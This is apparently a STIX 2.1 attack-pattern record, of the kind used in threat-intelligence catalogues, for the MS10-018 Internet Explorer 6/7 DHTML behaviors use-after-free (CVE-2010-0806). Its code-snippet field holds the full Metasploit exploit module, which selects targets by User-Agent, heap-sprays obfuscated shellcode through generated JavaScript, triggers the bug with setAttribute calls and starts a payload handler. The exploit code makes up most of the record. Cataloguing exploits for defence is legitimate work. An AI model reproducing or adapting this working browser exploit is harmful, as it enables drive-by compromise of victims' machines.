{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91efe02f-bacb-481b-9797-6f13b8048511",
    "created": "2024-08-14T16:42:02.242557Z",
    "modified": "2024-08-14T16:42:02.242561Z",
    "name": "MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free",
    "description": " This module exploits a use-after-free vulnerability within the DHTML behaviors functionality of Microsoft Internet Explorer versions 6 and 7. This bug was discovered being used in-the-wild and was previously known as the \"iepeers\" vulnerability. The name comes from Microsoft's suggested workaround to block access to the iepeers.dll file.  According to Nico Waisman, \"The bug itself is when trying to persist an object using the setAttribute, which end up calling VariantChangeTypeEx with both the source and the destination being the same variant. So if you send as a variant an IDISPATCH the algorithm will try to do a VariantClear of the destination before using it. This will end up on a call to PlainRelease which deref the reference and clean the object.\"  NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_018_ie_behaviors.rb",
            "external_id": "ms10_018_ie_behaviors.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0806"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20100929225343/http://www.avertlabs.com/research/blog/index.php/2010/03/09/targeted-internet-explorer-0day-attack-announced-cve-2010-0806/"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20120627174253/http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# originally ie_iepeers_pointer.rb\n#\n# Microsoft Internet Explorer iepeers.dll use-after-free exploit for the Metasploit Framework\n#\n# Tested successfully on the following platforms:\n#  - Microsoft Internet Explorer 7, Windows Vista SP2\n#  - Microsoft Internet Explorer 7, Windows XP SP3\n#  - Microsoft Internet Explorer 6, Windows XP SP3\n#\n# Exploit found in-the-wild. For additional details:\n# http://www.rec-sec.com/2010/03/10/internet-explorer-iepeers-use-after-free-exploit/\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #\n  # ms10_090_ie_css_clip is newer but *much* less reliable\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"7.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :vuln_test  => nil, # no way to test without just trying it\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free',\n      'Description'    => %q{\n          This module exploits a use-after-free vulnerability within the DHTML behaviors\n        functionality of Microsoft Internet Explorer versions 6 and 7. This bug was\n        discovered being used in-the-wild and was previously known as the \"iepeers\"\n        vulnerability. The name comes from Microsoft's suggested workaround to block\n        access to the iepeers.dll file.\n\n        According to Nico Waisman, \"The bug itself is when trying to persist an object\n        using the setAttribute, which end up calling VariantChangeTypeEx with both the\n        source and the destination being the same variant. So if you send as a variant\n        an IDISPATCH the algorithm will try to do a VariantClear of the destination before\n        using it. This will end up on a call to PlainRelease which deref the reference\n        and clean the object.\"\n\n        NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown',                         # original discovery\n          'Trancer <mtrancer[at]gmail.com>', # metasploit module\n          'Nanika',                          # HIT2010 IE7 reliable PoC\n          'jduck'                            # minor cleanups\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0806' ],\n          [ 'OSVDB', '62810' ],\n          [ 'BID', '38615' ],\n          [ 'URL', 'https://web.archive.org/web/20100929225343/http://www.avertlabs.com/research/blog/index.php/2010/03/09/targeted-internet-explorer-0day-attack-announced-cve-2010-0806/' ],\n          [ 'URL', 'https://web.archive.org/web/20120627174253/http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html' ],\n          [ 'MSB', 'MS10-018' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ '(Automatic) IE6, IE7 on Windows NT, 2000, XP, 2003 and Vista',\n            {\n              'Method' => 'automatic'\n            }\n          ],\n\n          [ 'IE 6 SP0-SP2 (onclick)',\n            {\n              'Method' => 'onclick',\n              'Ret' => 0x0C0C0C0C\n            }\n          ],\n\n          # \"A great celebration of HIT2010\" - http://www.hitcon.org/\n          [ 'IE 7.0 (marquee)',\n            {\n              'Method' => 'marquee',\n              'Ret' => 0x0C0C0C0C\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-03-09',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def auto_target(cli, request)\n    mytarget = nil\n\n    agent = request.headers['User-Agent']\n    if agent =~ /Windows NT 6\\.0/\n      mytarget = targets[2]   # IE7 on Vista\n    elsif agent =~ /MSIE 7\\.0/\n      mytarget = targets[2]   # IE7 on XP and 2003\n    elsif agent =~ /MSIE 6\\.0/\n      mytarget = targets[1]   # IE6 on NT, 2000, XP and 2003\n    else\n      print_error(\"Unknown User-Agent #{agent}\")\n    end\n\n    mytarget\n  end\n\n\n  def on_request_uri(cli, request)\n\n    if target['Method'] == 'automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    else\n      mytarget = target\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name} (target: #{mytarget.name})...\")\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))\n\n    # Set the return\\nops\n    ret  \t    = Rex::Text.to_unescape([mytarget.ret].pack('V'))\n\n    # Randomize the javascript variable names\n    j_counter\t = rand_text_alpha(rand(30) + 2)\n    j_function2\t = rand_text_alpha(rand(100) + 1)\n    j_object\t    = rand_text_alpha(rand(100) + 1)\n    j_id\t\t    = rand_text_alpha(rand(100) + 1)\n\n    heapspray = ::Rex::Exploitation::JSObfu.new %Q|\nfunction heapspray(){\n  var shellcode = unescape('#{shellcode}');\n  var memory = new Array();\n  var slackspace = 0x86000-(shellcode.length*2);\n  var nops = unescape('#{ret}');\n  while(nops.length<slackspace/2) { nops+=nops; }\n  var fillblock = nops.substring(0,slackspace/2);\n  delete nops;\n  for(counter=0; counter<270; counter++) {\n    memory[counter] = fillblock + fillblock + shellcode;\n  }\n}\n    |\n    heapspray.obfuscate(memory_sensitive: true)\n\n    # Construct the final page\n    case mytarget['Method']\n\n    when 'onclick'\n      html = %Q|<html><body>\n<button id='#{j_id}' onclick='#{j_function2}();' style='display:none'></button>\n<script language='javascript'>\n#{heapspray}\nfunction #{j_function2}(){\n#{heapspray.sym('heapspray')}();\nvar #{j_object} = document.createElement('body');\n#{j_object}.addBehavior('#default#userData');\ndocument.appendChild(#{j_object});\ntry {\nfor (#{j_counter}=0; #{j_counter}<10; #{j_counter}++) {\n#{j_object}.setAttribute('s',window);\n}\n} catch(e){ }\nwindow.status+='';\n}\ndocument.getElementById('#{j_id}').onclick();\n</script></body></html>\n|\n\n    when 'marquee'\n      j_attrib = rand_text_alpha(6);\n      html = %Q|<html>\n<head>\n<style type=\"text/css\">\n.#{j_object} {behavior: url(#default#userData);}\n</style>\n</head>\n<script>\n#{heapspray}\nfunction #{j_function2}() {\n#{heapspray.sym('heapspray')}();\nfor (#{j_counter} = 1; #{j_counter} <10; #{j_counter} ++ ){\n#{j_id}.setAttribute(\"#{j_attrib}\",document.location);\n}\n#{j_id}.setAttribute(\"#{j_attrib}\",document.getElementsByName(\"style\"));\ndocument.location=\"about:\\\\u0c0c\\\\u0c0c\\\\u0c0c\\\\u0c0cblank\";\n}\n</script>\n<body onload=\"#{j_function2}();\"></body>\n<MARQUEE id=\"#{j_id}\" class=\"#{j_object}\"></MARQUEE>\n</html>\n|\n\n    end\n\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-09",
    "x_mitre_platforms": [
        "win'"
    ]
}